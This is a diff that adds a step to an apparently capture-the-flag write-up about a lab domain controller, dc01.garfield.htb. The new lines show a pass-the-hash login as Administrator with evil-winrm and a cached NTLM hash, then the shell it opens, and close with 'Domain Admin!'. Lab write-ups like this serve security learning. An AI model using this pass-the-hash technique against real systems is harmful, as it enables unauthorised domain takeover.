@@ -576,6 +576,21 @@ I now need to dump the administrator hash
 
 I can then elevate the token and get the administrator NTLM now that it is cached
 
+```python
+❯❯❯ evil-winrm -i dc01.garfield.htb -u Administrator -H 'ee238f6debc752010428f20875b092d5' 
+                                        
+Evil-WinRM shell v4.1
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Info: Connection successful
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+![](Pasted%20image%2020261110202950.png)
+
+Domain Admin!
+
 
 
 
